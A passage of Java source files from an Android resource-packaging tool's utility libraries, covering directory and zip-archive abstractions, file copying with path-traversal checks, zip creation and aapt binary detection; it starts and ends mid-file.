    public void copyToDir(Directory out) throws DirectoryException {
        DirUtil.copyToDir(out, out);
    }

    public void copyToDir(Directory out, String[] fileNames)
            throws DirectoryException {
        DirUtil.copyToDir(out, out, fileNames);
    }

    public void copyToDir(Directory out, String fileName)
            throws DirectoryException {
        DirUtil.copyToDir(out, out, fileName);
    }

    public void copyToDir(File out) throws DirectoryException {
        DirUtil.copyToDir(this, out);
    }

    public void copyToDir(File out, String[] fileNames)
            throws DirectoryException {
        DirUtil.copyToDir(this, out, fileNames);
    }

    public void copyToDir(File out, String fileName)
            throws DirectoryException {
        DirUtil.copyToDir(this, out, fileName);
    }

    public int getCompressionLevel(String fileName)
            throws DirectoryException {
        return -1;  // Unknown
    }

    protected Map<String, AbstractDirectory> getAbstractDirs() {
        return getAbstractDirs(false);
    }

    protected Map<String, AbstractDirectory> getAbstractDirs(boolean recursive) {
        if (mDirs == null) {
            loadDirs();
        }
        if (!recursive) {
            return mDirs;
        }

        Map<String, AbstractDirectory> dirs = new LinkedHashMap<>(mDirs);
        for (Map.Entry<String, AbstractDirectory> dir : getAbstractDirs().entrySet()) {
            for (Map.Entry<String, AbstractDirectory> subdir : dir.getValue().getAbstractDirs(
                    true).entrySet()) {
                dirs.put(dir.getKey() + separator + subdir.getKey(),
                        subdir.getValue());
            }
        }
        return dirs;
    }


    public void close() throws IOException {

    }

    private SubPath getSubPath(String path) throws PathNotExist {
        ParsedPath parsed = parsePath(path);
        if (parsed.dir == null) {
            return new SubPath(null, parsed.subpath);
        }
        if (! getAbstractDirs().containsKey(parsed.dir)) {
            throw new PathNotExist(path);
        }
        return new SubPath(getAbstractDirs().get(parsed.dir), parsed.subpath);
    }

    private ParsedPath parsePath(String path) {
        int pos = path.indexOf(separator);
        if (pos == -1) {
            return new ParsedPath(null, path);
        }
        return new ParsedPath(path.substring(0, pos), path.substring(pos + 1));
    }

    protected abstract void loadFiles();
    protected abstract void loadDirs();
    protected abstract InputStream getFileInputLocal(String name)
        throws DirectoryException;
    protected abstract OutputStream getFileOutputLocal(String name)
        throws DirectoryException;
    protected abstract AbstractDirectory createDirLocal(String name)
        throws DirectoryException;
    protected abstract void removeFileLocal(String name);


    private class ParsedPath {
        public final String dir;
        public final String subpath;
        public ParsedPath(String dir, String subpath) {
            this.dir = dir;
            this.subpath = subpath;
        }
    }

    private class SubPath {
        public final AbstractDirectory dir;
        public final String path;

        public SubPath(AbstractDirectory dir, String path) {
            this.dir = dir;
            this.path = path;
        }
    }
}

```

`brut.j.dir/src/main/java/brut/directory/DirUtil.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.directory;

import brut.common.BrutException;
import brut.common.InvalidUnknownFileException;
import brut.common.RootUnknownFileException;
import brut.common.TraversalUnknownFileException;
import brut.util.BrutIO;
import brut.util.OS;
import java.io.*;
import java.util.logging.Logger;

public class DirUtil {
    private static final Logger LOGGER = Logger.getLogger("");

    private DirUtil() {
        // Private constructor for utility class
    }

    public static void copyToDir(Directory in, Directory out)
            throws DirectoryException {
        for (String fileName : in.getFiles(true)) {
            copyToDir(in, out, fileName);
        }
    }

    public static void copyToDir(Directory in, Directory out,
            String[] fileNames) throws DirectoryException {
        for (String fileName : fileNames) {
            copyToDir(in, out, fileName);
        }
    }

    public static void copyToDir(Directory in, Directory out, String fileName)
            throws DirectoryException {
        copyToDir(in, out, fileName, fileName);
    }

    public static void copyToDir(Directory in, Directory out, String inFile, String outFile)
            throws DirectoryException {
        try {
            if (in.containsDir(inFile)) {
                in.getDir(inFile).copyToDir(out.createDir(outFile));
            } else {
                BrutIO.copyAndClose(in.getFileInput(inFile), out.getFileOutput(outFile));
            }
        } catch (IOException ex) {
            throw new DirectoryException("Error copying file: " + inFile, ex);
        }
    }

    public static void copyToDir(Directory in, File out)
            throws DirectoryException {
        for (String fileName : in.getFiles(true)) {
            copyToDir(in, out, fileName);
        }
    }

    public static void copyToDir(Directory in, File out, String[] fileNames)
            throws DirectoryException {
        for (String fileName : fileNames) {
            copyToDir(in, out, fileName);
        }
    }

    public static void copyToDir(Directory in, File out, String fileName)
            throws DirectoryException {
        try {
            if (in.containsDir(fileName)) {
                OS.rmdir(new File(out, fileName));
                in.getDir(fileName).copyToDir(new File(out, fileName));
            } else {
                if (fileName.equals("res") && !in.containsFile(fileName)) {
                    return;
                }
                String cleanedFilename = BrutIO.sanitizeUnknownFile(out, fileName);
                File outFile = new File(out, cleanedFilename);
                outFile.getParentFile().mkdirs();
                BrutIO.copyAndClose(in.getFileInput(fileName), new FileOutputStream(outFile));
            }
        } catch (RootUnknownFileException | InvalidUnknownFileException | TraversalUnknownFileException exception) {
            LOGGER.warning(String.format("Skipping file %s (%s)", fileName, exception.getMessage()));
        } catch (IOException | BrutException ex) {
            throw new DirectoryException("Error copying file: " + fileName, ex);
        }
    }
}

```

`brut.j.dir/src/main/java/brut/directory/Directory.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.directory;

import java.io.File;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.util.Map;
import java.util.Set;

public interface Directory {
    Set<String> getFiles();

    Set<String> getFiles(boolean recursive);

    Map<String, Directory> getDirs();

    Map<String, Directory> getDirs(boolean recursive);

    boolean containsFile(String path);

    boolean containsDir(String path);

    InputStream getFileInput(String path) throws DirectoryException;

    OutputStream getFileOutput(String path) throws DirectoryException;

    Directory getDir(String path) throws PathNotExist;

    Directory createDir(String path) throws DirectoryException;

    boolean removeFile(String path);

    void copyToDir(Directory out) throws DirectoryException;

    void copyToDir(Directory out, String[] fileNames)
        throws DirectoryException;

    void copyToDir(Directory out, String fileName)
        throws DirectoryException;

    void copyToDir(File out) throws DirectoryException;

    void copyToDir(File out, String[] fileNames)
        throws DirectoryException;

    void copyToDir(File out, String fileName)
        throws DirectoryException;

    long getSize(String fileName)
        throws DirectoryException;

    long getCompressedSize(String fileName)
        throws DirectoryException;

    int getCompressionLevel(String fileName)
        throws DirectoryException;

    void close() throws IOException;

    char separator = '/';
}

```

`brut.j.dir/src/main/java/brut/directory/DirectoryException.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.directory;

import brut.common.BrutException;

public class DirectoryException extends BrutException {
    private static final long serialVersionUID = -8871963042836625387L;

    public DirectoryException(String detailMessage, Throwable throwable) {
        super(detailMessage, throwable);
    }

    public DirectoryException(String detailMessage) {
        super(detailMessage);
    }

    public DirectoryException(Throwable throwable) {
        super(throwable);
    }

    public DirectoryException() {
        super();
    }
}

```

`brut.j.dir/src/main/java/brut/directory/ExtFile.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.directory;

import java.io.File;
import java.io.IOException;
import java.net.URI;

public class ExtFile extends File {
    public ExtFile(File file) {
        super(file.getPath());
    }

    public ExtFile(URI uri) {
        super(uri);
    }

    public ExtFile(File parent, String child) {
        super(parent, child);
    }

    public ExtFile(String parent, String child) {
        super(parent, child);
    }

    public ExtFile(String pathname) {
        super(pathname);
    }

    public Directory getDirectory() throws DirectoryException {
        if (mDirectory == null) {
            if (isDirectory()) {
                mDirectory = new FileDirectory(this);
            } else {
                mDirectory = new ZipRODirectory(this);
            }
        }
        return mDirectory;
    }

    public void close() throws IOException {
        if (mDirectory != null) {
            mDirectory.close();
        }
    }

    private Directory mDirectory;
}

```

`brut.j.dir/src/main/java/brut/directory/FileDirectory.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.directory;

import java.io.*;
import java.net.URLDecoder;
import java.util.LinkedHashMap;
import java.util.LinkedHashSet;

public class FileDirectory extends AbstractDirectory {
    private final File mDir;

    public FileDirectory(ExtFile dir, String folder) throws DirectoryException {
        this(new File(dir.toString().replaceAll("%20", " "), folder));
    }

    public FileDirectory(String dir) throws DirectoryException, UnsupportedEncodingException {
        this(new File(URLDecoder.decode(dir, "UTF-8")));
    }

    public FileDirectory(File dir) throws DirectoryException {
        super();
        if (! dir.isDirectory()) {
            throw new DirectoryException("file must be a directory: " + dir);
        }
        mDir = dir;
    }

    @Override
    public long getSize(String fileName)
            throws DirectoryException {
        File file = new File(generatePath(fileName));
        if (! file.isFile()) {
            throw new DirectoryException("file must be a file: " + file);
        }
        return file.length();
    }

    @Override
    public long getCompressedSize(String fileName)
            throws DirectoryException {
        return getSize(fileName);
    }

    @Override
    protected AbstractDirectory createDirLocal(String name) throws DirectoryException {
        File dir = new File(generatePath(name));
        dir.mkdir();
        return new FileDirectory(dir);
    }

    @Override
    protected InputStream getFileInputLocal(String name) throws DirectoryException {
        try {
            return new FileInputStream(generatePath(name));
        } catch (FileNotFoundException e) {
            throw new DirectoryException(e);
        }
    }

    @Override
    protected OutputStream getFileOutputLocal(String name) throws DirectoryException {
        try {
            return new FileOutputStream(generatePath(name));
        } catch (FileNotFoundException e) {
            throw new DirectoryException(e);
        }
    }

    @Override
    protected void loadDirs() {
        loadAll();
    }

    @Override
    protected void loadFiles() {
        loadAll();
    }

    @Override
    protected void removeFileLocal(String name) {
        new File(generatePath(name)).delete();
    }

    private String generatePath(String name) {
        return getDir().getPath() + separator + name;
    }

    private void loadAll() {
        mFiles = new LinkedHashSet<>();
        mDirs = new LinkedHashMap<>();

        File[] files = getDir().listFiles();
        for (File file : files) {
            if (file.isFile()) {
                mFiles.add(file.getName());
            } else {
                // IMPOSSIBLE_EXCEPTION
                try {
                    mDirs.put(file.getName(), new FileDirectory(file));
                } catch (DirectoryException ignored) {}
            }
        }
    }

    private File getDir() {
        return mDir;
    }
}

```

`brut.j.dir/src/main/java/brut/directory/PathAlreadyExists.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.directory;

public class PathAlreadyExists extends DirectoryException {
    public PathAlreadyExists() {
    }

    public PathAlreadyExists(Throwable throwable) {
        super(throwable);
    }

    public PathAlreadyExists(String detailMessage) {
        super(detailMessage);
    }

    public PathAlreadyExists(String detailMessage, Throwable throwable) {
        super(detailMessage, throwable);
    }

    private static final long serialVersionUID = 3776428251424428904L;
}

```

`brut.j.dir/src/main/java/brut/directory/PathNotExist.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.directory;

public class PathNotExist extends DirectoryException {
    public PathNotExist() {
        super();
    }

    public PathNotExist(String detailMessage, Throwable throwable) {
        super(detailMessage, throwable);
    }

    public PathNotExist(String detailMessage) {
        super(detailMessage);
    }

    public PathNotExist(Throwable throwable) {
        super(throwable);
    }

    private static final long serialVersionUID = -6949242015506342032L;
}

```

`brut.j.dir/src/main/java/brut/directory/ZipRODirectory.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.directory;

import java.io.File;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.util.Enumeration;
import java.util.LinkedHashMap;
import java.util.LinkedHashSet;
import java.util.zip.ZipEntry;
import java.util.zip.ZipFile;

public class ZipRODirectory extends AbstractDirectory {
    private final ZipFile mZipFile;
    private final String mPath;

    public ZipRODirectory(String zipFileName) throws DirectoryException {
        this(zipFileName, "");
    }

    public ZipRODirectory(File zipFile) throws DirectoryException {
        this(zipFile, "");
    }

    public ZipRODirectory(ZipFile zipFile) {
        this(zipFile, "");
    }

    public ZipRODirectory(String zipFileName, String path)
            throws DirectoryException {
        this(new File(zipFileName), path);
    }

    public ZipRODirectory(File zipFile, String path) throws DirectoryException {
        super();
        try {
            mZipFile = new ZipFile(zipFile);
        } catch (IOException e) {
            throw new DirectoryException(e);
        }
        mPath = path;
    }

    public ZipRODirectory(ZipFile zipFile, String path) {
        super();
        mZipFile = zipFile;
        mPath = path;
    }

    @Override
    protected AbstractDirectory createDirLocal(String name) {
        throw new UnsupportedOperationException();
    }

    @Override
    protected InputStream getFileInputLocal(String name)
            throws DirectoryException {
        try {
            return getZipFile().getInputStream(new ZipEntry(getPath() + name));
        } catch (IOException e) {
            throw new PathNotExist(name, e);
        }
    }

    @Override
    protected OutputStream getFileOutputLocal(String name) {
        throw new UnsupportedOperationException();
    }

    @Override
    protected void loadDirs() {
        loadAll();
    }

    @Override
    protected void loadFiles() {
        loadAll();
    }

    @Override
    protected void removeFileLocal(String name) {
        throw new UnsupportedOperationException();
    }

    @Override
    public long getSize(String fileName)
            throws DirectoryException {
        ZipEntry entry = getZipFileEntry(fileName);
        return entry.getSize();
    }

    @Override
    public long getCompressedSize(String fileName)
            throws DirectoryException {
        ZipEntry entry = getZipFileEntry(fileName);
        return entry.getCompressedSize();
    }

    @Override
    public int getCompressionLevel(String fileName)
            throws DirectoryException {
        ZipEntry entry = getZipFileEntry(fileName);
        return entry.getMethod();
    }

    private ZipEntry getZipFileEntry(String fileName)
            throws DirectoryException {
        ZipEntry entry = mZipFile.getEntry(fileName);
        if (entry == null) {
            throw new PathNotExist("Entry not found: " + fileName);
        }
        return entry;
    }

    private void loadAll() {
        mFiles = new LinkedHashSet<>();
        mDirs = new LinkedHashMap<>();

        int prefixLen = getPath().length();
        Enumeration<? extends ZipEntry> entries = getZipFile().entries();
        while (entries.hasMoreElements()) {
            ZipEntry entry = entries.nextElement();
            String name = entry.getName();

            if (name.equals(getPath()) || ! name.startsWith(getPath()) || name.contains(".." + separator)) {
                continue;
            }

            String subname = name.substring(prefixLen);

            int pos = subname.indexOf(separator);
            if (pos == -1) {
                if (! entry.isDirectory()) {
                    mFiles.add(subname);
                    continue;
                }
            } else {
                subname = subname.substring(0, pos);
            }

            if (! mDirs.containsKey(subname)) {
                AbstractDirectory dir = new ZipRODirectory(getZipFile(), getPath() + subname + separator);
                mDirs.put(subname, dir);
            }
        }
    }

    private String getPath() {
        return mPath;
    }

    private ZipFile getZipFile() {
        return mZipFile;
    }


    public void close() throws IOException {
        mZipFile.close();
    }
}

```

`brut.j.dir/src/main/java/brut/directory/ZipUtils.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.directory;

import brut.common.BrutException;
import brut.util.BrutIO;
import org.apache.commons.io.FilenameUtils;
import org.apache.commons.io.IOUtils;

import java.io.*;
import java.util.Collection;
import java.util.zip.CRC32;
import java.util.zip.ZipEntry;
import java.util.zip.ZipOutputStream;

public class ZipUtils {

    private static Collection<String> mDoNotCompress;

    private ZipUtils() {
        // Private constructor for utility class
    }

    public static void zipFolders(final File folder, final File zip, final File assets, final Collection<String> doNotCompress)
            throws BrutException, IOException {

        mDoNotCompress = doNotCompress;
        ZipOutputStream zipOutputStream = new ZipOutputStream(new FileOutputStream(zip));
        zipFolders(folder, zipOutputStream);

        // We manually set the assets because we need to retain the folder structure
        if (assets != null) {
            processFolder(assets, zipOutputStream, assets.getPath().length() - 6);
        }
        zipOutputStream.close();
    }

    private static void zipFolders(final File folder, final ZipOutputStream outputStream)
            throws BrutException, IOException {
        processFolder(folder, outputStream, folder.getPath().length() + 1);
    }

    private static void processFolder(final File folder, final ZipOutputStream zipOutputStream, final int prefixLength)
            throws BrutException, IOException {
        for (final File file : folder.listFiles()) {
            if (file.isFile()) {
                final String cleanedPath = BrutIO.sanitizeUnknownFile(folder, file.getPath().substring(prefixLength));
                final ZipEntry zipEntry = new ZipEntry(BrutIO.normalizePath(cleanedPath));

                // aapt binary by default takes in parameters via -0 arsc to list extensions that shouldn't be
                // compressed. We will replicate that behavior
                final String extension = FilenameUtils.getExtension(file.getAbsolutePath());
                if (mDoNotCompress != null && (mDoNotCompress.contains(extension) || mDoNotCompress.contains(zipEntry.getName()))) {
                    zipEntry.setMethod(ZipEntry.STORED);
                    zipEntry.setSize(file.length());
                    BufferedInputStream unknownFile = new BufferedInputStream(new FileInputStream(file));
                    CRC32 crc = BrutIO.calculateCrc(unknownFile);
                    zipEntry.setCrc(crc.getValue());
                    unknownFile.close();
                } else {
                    zipEntry.setMethod(ZipEntry.DEFLATED);
                }

                zipOutputStream.putNextEntry(zipEntry);
                try (FileInputStream inputStream = new FileInputStream(file)) {
                    IOUtils.copy(inputStream, zipOutputStream);
                }
                zipOutputStream.closeEntry();
            } else if (file.isDirectory()) {
                processFolder(file, zipOutputStream, prefixLength);
            }
        }
    }
}

```

`brut.j.util/build.gradle`:

```gradle
/**
 *  Copyright 2014 Ryszard Wiśniewski <brut.alll@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */

dependencies {
  implementation project(':brut.j.common'),
                 depends.commons_io
  testImplementation depends.junit
}

```

`brut.j.util/src/main/java/brut/util/AaptManager.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.util;

import brut.common.BrutException;
import java.io.File;
import java.util.ArrayList;
import java.util.List;

public class AaptManager {

    public static File getAapt2() throws BrutException {
        return getAapt(2);
    }

    public static File getAapt1() throws BrutException {
        return getAapt(1);
    }

    private static File getAapt(Integer version) throws BrutException {
        File aaptBinary;
        String aaptVersion = getAaptBinaryName(version);

        if (! OSDetection.is64Bit() && OSDetection.isMacOSX()) {
            throw new BrutException("32 bit OS detected. No 32 bit binaries available.");
        }

        // Set the 64 bit flag
        aaptVersion += OSDetection.is64Bit() ? "_64" : "";

        try {
            if (OSDetection.isMacOSX()) {
                aaptBinary = Jar.getResourceAsFile("/prebuilt/macosx/" + aaptVersion, AaptManager.class);
            } else if (OSDetection.isUnix()) {
                aaptBinary = Jar.getResourceAsFile("/prebuilt/linux/" + aaptVersion, AaptManager.class);
            } else if (OSDetection.isWindows()) {
                aaptBinary = Jar.getResourceAsFile("/prebuilt/windows/" + aaptVersion + ".exe", AaptManager.class);
            } else {
                throw new BrutException("Could not identify platform: " + OSDetection.returnOS());
            }
        } catch (BrutException ex) {
            throw new BrutException(ex);
        }

        if (aaptBinary.setExecutable(true)) {
            return aaptBinary;
        }

        throw new BrutException("Can't set aapt binary as executable");
    }

    public static String getAaptExecutionCommand(String aaptPath, File aapt) throws BrutException {
        if (! aaptPath.isEmpty()) {
            File aaptFile = new File(aaptPath);
            if (aaptFile.canRead() && aaptFile.exists()) {
                aaptFile.setExecutable(true);
                return aaptFile.getPath();
            } else {
                throw new BrutException("binary could not be read: " + aaptFile.getAbsolutePath());
            }
        } else {
            return aapt.getAbsolutePath();
        }
    }

    public static int getAaptVersion(String aaptLocation) throws BrutException {
        return getAaptVersion(new File(aaptLocation));
    }

    public static String getAaptBinaryName(Integer version) {
        return "aapt" + (version == 2 ? "2" : "");
    }

    public static int getAppVersionFromString(String version) throws BrutException {
        if (version.startsWith("Android Asset Packaging Tool (aapt) 2:")) {
            return 2;
        } else if (version.startsWith("Android Asset Packaging Tool (aapt) 2.")) {
            return 2; // Prior to Android SDK 26.0.2
        } else if (version.startsWith("Android Asset Packaging Tool, v0.")) {
            return 1;
        }

        throw new BrutException("aapt version could not be identified: " + version);
    }

    public static int getAaptVersion(File aapt) throws BrutException {
        if (!aapt.isFile()) {
            throw new BrutException("Could not identify aapt binary as executable.");
        }
        aapt.setExecutable(true);

        List<String> cmd = new ArrayList<>();
        cmd.add(aapt.getAbsolutePath());
        cmd.add("version");

        String version = OS.execAndReturn(cmd.toArray(new String[0]));

        if (version == null) {
            throw new BrutException("Could not execute aapt binary at location: " + aapt.getAbsolutePath());
        }

        return getAppVersionFromString(version);
    }
}

```

`brut.j.util/src/main/java/brut/util/BrutIO.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.util;

import brut.common.BrutException;
import brut.common.InvalidUnknownFileException;
import brut.common.RootUnknownFileException;
import brut.common.TraversalUnknownFileException;
import org.apache.commons.io.IOUtils;

import java.io.*;
import java.util.zip.CRC32;
import java.util.zip.ZipEntry;
import java.util.zip.ZipFile;
import java.util.zip.ZipOutputStream;

public class BrutIO {
    public static void copyAndClose(InputStream in, OutputStream out)
            throws IOException {
        try {
            IOUtils.copy(in, out);
        } finally {
            IOUtils.closeQuietly(in);
            IOUtils.closeQuietly(out);
        }
    }

    public static long recursiveModifiedTime(File[] files) {
        long modified = 0;
        for (File file : files) {
            long submodified = recursiveModifiedTime(file);
            if (submodified > modified) {
                modified = submodified;
            }
        }
        return modified;
    }

    public static long recursiveModifiedTime(File file) {
        long modified = file.lastModified();
        if (file.isDirectory()) {
            File[] subfiles = file.listFiles();
            for (File subfile : subfiles) {
                long submodified = recursiveModifiedTime(subfile);
                if (submodified > modified) {
                    modified = submodified;
                }
            }
        }
        return modified;
    }

    public static CRC32 calculateCrc(InputStream input) throws IOException {
        CRC32 crc = new CRC32();
        int bytesRead;
        byte[] buffer = new byte[8192];
        while((bytesRead = input.read(buffer)) != -1) {
            crc.update(buffer, 0, bytesRead);
        }
        return crc;
    }

    public static String sanitizeUnknownFile(final File directory, final String entry) throws IOException, BrutException {
        if (entry.length() == 0) {
            throw new InvalidUnknownFileException("Invalid Unknown File");
        }

        if (new File(entry).isAbsolute()) {
            throw new RootUnknownFileException("Absolute Unknown Files is not allowed");
        }

        final String canonicalDirPath = directory.getCanonicalPath() + File.separator;
        final String canonicalEntryPath = new File(directory, entry).getCanonicalPath();

        if (!canonicalEntryPath.startsWith(canonicalDirPath)) {
            throw new TraversalUnknownFileException("Directory Traversal is not allowed");
        }

        // https://stackoverflow.com/q/2375903/455008
        return canonicalEntryPath.substring(canonicalDirPath.length());
    }

    public static String normalizePath(String path) {
        char separator = File.separatorChar;

        if (separator != '/') {
            return path.replace(separator, '/');
        }

        return path;
    }

    public static void copy(File inputFile, ZipOutputStream outputFile) throws IOException {
        try (
                FileInputStream fis = new FileInputStream(inputFile)
        ) {
            IOUtils.copy(fis, outputFile);
        }
    }

    public static void copy(ZipFile inputFile, ZipOutputStream outputFile, ZipEntry entry) throws IOException {
        try (
                InputStream is = inputFile.getInputStream(entry)
        ) {
            IOUtils.copy(is, outputFile);
        }
    }

}

```

`brut.j.util/src/main/java/brut/util/DataInputDelegate.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.util;

import java.io.DataInput;
import java.io.IOException;

public abstract class DataInputDelegate implements DataInput {
    protected final DataInput mDelegate;

    public DataInputDelegate(DataInput delegate) {
        this.mDelegate = delegate;
    }

    public int skipBytes(int n) throws IOException {
        return mDelegate.skipBytes(n);
    }

    public int readUnsignedShort() throws IOException {
        return mDelegate.readUnsignedShort();
    }

    public int readUnsignedByte() throws IOException {
        return mDelegate.readUnsignedByte();
    }

    public String readUTF() throws IOException {
        return mDelegate.readUTF();
    }

    public short readShort() throws IOException {
        return mDelegate.readShort();
    }

    public long readLong() throws IOException {
        return mDelegate.readLong();
    }

    public String readLine() throws IOException {
        return mDelegate.readLine();
    }

    public int readInt() throws IOException {
        return mDelegate.readInt();
    }

    public void readFully(byte[] b, int off, int len) throws IOException {
        mDelegate.readFully(b, off, len);
    }

    public void readFully(byte[] b) throws IOException {
        mDelegate.readFully(b);
    }

    public float readFloat() throws IOException {
        return mDelegate.readFloat();
    }

    public double readDouble() throws IOException {
        return mDelegate.readDouble();
    }

    public char readChar() throws IOException {
